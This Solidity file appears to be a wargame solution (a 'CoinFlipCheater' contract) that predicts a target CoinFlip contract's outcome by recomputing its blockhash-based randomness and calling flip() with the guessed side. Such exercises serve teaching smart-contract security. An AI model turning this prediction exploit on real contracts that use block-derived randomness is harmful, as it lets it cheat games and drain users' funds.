// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipCheater {
    constructor() {}

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipAddress = 0x33C7Af9d0E10FB4D230D317376C87caB80C276Ec;

    function cheat() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        CoinFlip cf = CoinFlip(coinFlipAddress);
        return cf.flip(side);
    }
}